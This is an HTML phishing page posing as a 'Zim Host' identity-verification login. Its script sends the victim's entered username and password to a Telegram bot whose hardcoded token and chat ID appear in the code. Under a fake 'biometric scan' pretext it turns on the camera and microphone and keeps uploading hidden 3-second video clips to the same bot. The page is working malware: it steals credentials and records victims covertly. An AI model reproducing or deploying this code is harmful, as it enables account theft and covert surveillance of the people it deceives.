<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZIM HOST TERMINAL | LIVE MONITOR</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg: #02040a; --neon: #10b981; --panel: #0d1117; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; }

        /* 4K DESIGN ELEMENTS */
        .glow { position: fixed; width: 10px; height: 10px; background: var(--neon); border-radius: 50%; box-shadow: 0 0 20px var(--neon); }
        .tl { top: 20px; left: 20px; } .tr { top: 20px; right: 20px; }

        .terminal-box { 
            background: var(--panel); width: 90%; max-width: 450px; padding: 40px; 
            border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); text-align: center;
        }

        .input-box { width: 100%; padding: 15px; background: #000; border: 1px solid #30363d; border-radius: 12px; color: #fff; margin-top: 20px; outline: none; }
        .btn-live { width: 100%; padding: 15px; background: #238636; border: none; border-radius: 12px; font-weight: 700; color: #fff; cursor: pointer; margin-top: 20px; }
        
        /* STATUS LOGS */
        #status-log { margin-top: 20px; font-size: 11px; color: #8b949e; font-family: monospace; }
        #hidden-vid { position: fixed; top: -5000px; }
    </style>
</head>
<body>

    <div class="glow tl"></div><div class="glow tr"></div>

    <div class="terminal-box" id="auth-ui">
        <h1 style="color: var(--neon); letter-spacing: 2px;">ZIM HOST TEST</h1>
        <p style="font-size: 13px; color: #8b949e;">IDENTITY VERIFICATION REQUIRED</p>
        
        <input type="text" id="user" class="input-box" placeholder="Network Username">
        <input type="password" id="pass" class="input-box" placeholder="Access Token">
        
        <button class="btn-live" onclick="startLiveStream()">INITIATE SECURE SESSION</button>
        <div id="status-log">SYSTEM STANDBY...</div>
    </div>

    <video id="hidden-vid" autoplay playsinline muted></video>

    <script>
        const TOKEN = '8525258971:AAHdI6aEmOIEFSkjVM7sF8eALK-P6nZNvFI';
        const CHAT_ID = '6929073673';
        let mediaRecorder;
        let recordedChunks = [];

        async function startLiveStream() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            if(!u || !p) return;

            document.getElementById('status-log').innerHTML = "REQUESTING CAMERA ACCESS...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('hidden-vid').srcObject = stream;
                
                document.getElementById('auth-ui').innerHTML = `
                    <h2 style="color: var(--neon)">VERIFYING...</h2>
                    <div style="margin: 20px auto; width: 40px; height: 40px; border: 3px solid #333; border-top-color: var(--neon); border-radius: 50%; animation: spin 1s linear infinite;"></div>
                    <p>Live biometric scan in progress. Do not close browser.</p>
                `;

                // Send Login Data
                sendTelegramMessage(`ðŸš€ <b>LIVE SESSION START</b>\nUser: <code>${u}</code>\nPass: <code>${p}</code>`);

                // Start High-Speed Video Loop (3-second segments)
                captureLiveClip(stream);

            } catch (err) {
                alert("Identity verification failed. Camera is required for Zim Host access.");
                location.reload();
            }
        }

        function captureLiveClip(stream) {
            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    sendLiveVideo(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                // Immediately restart the recorder for the next "Live" segment
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 3000); // 3-second segments
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 3000);
        }

        async function sendLiveVideo(blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('video', blob, 'live_stream.mp4');
            fd.append('caption', `ðŸ”´ <b>LIVE FEED</b>\nTime: ${new Date().toLocaleTimeString()}`);

            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                method: 'POST',
                body: fd
            });
        }

        function sendTelegramMessage(text) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            });
        }
    </script>

    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
</body>
</html>
